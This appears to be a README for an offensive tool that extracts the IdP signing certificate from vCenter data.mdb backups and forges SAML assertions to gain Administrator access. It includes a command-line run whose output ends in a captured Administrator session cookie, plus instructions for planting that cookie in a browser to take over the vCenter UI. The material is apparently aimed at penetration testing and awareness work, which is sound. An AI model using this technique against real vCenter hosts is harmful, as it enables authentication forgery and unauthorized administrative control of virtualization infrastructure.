# vCenter SAML Login Tool
A tool to extract the IdP cert from vCenter backups and log in as Administrator

If you'd like to know more about several use cases for this tool and how we've used it to gain Administrative access to vCenter hosts check out our blog post: https://horizon3.ai/vcenter_saml_login

## Background
With root or administrative permissions, it is possible to extract the IdP certificates from the directory service information located within the data.mdb file on the VCSA host. These certificates are stored in cleartext and can be used to sign any SAML authentication request for any user - including the builtin Administrator.

We've commonly found vCenter backups that contain the data.mdb file as well as several critical CVEs have been released in the past year that lead to access to this file.

If you'd like to know more about several use cases for this tool and how we've used it to gain Administrative access to vCenter hosts check out our blog post: https://horizon3.ai/vcenter_saml_login

## Usage
```
root@kali:~/vcenter# python3 vcenter_saml_login.py -p data.mdb -t 10.0.100.200
[*] Successfully extracted the IdP certificate
[*] Successfully extracted trusted certificate 1
[*] Successfully extracted trusted certificate 2
[*] Obtaining hostname from vCenter SSL certificate
[*] Found hostname vcsa.olympus for 10.0.100.200
[*] Initiating SAML request with 10.0.100.200
[*] Generating SAML assertion
[*] Signing the SAML assertion
[*] Attempting to log into vCenter with the signed SAML request
[+] Successfuly obtained Administrator cookie for 10.0.100.200!
[+] Cookie: VSPHERE-UI-JSESSIONID=06D1630719B4DE33A4CE653458911640
```

With the above cookie, visit the VCSA instance at https://\<VCSA>\/ui, add the cookie under the /ui path, and re-browse to https://\<VCSA\>/ui. 

## Demonstration
![](vcenter.gif)
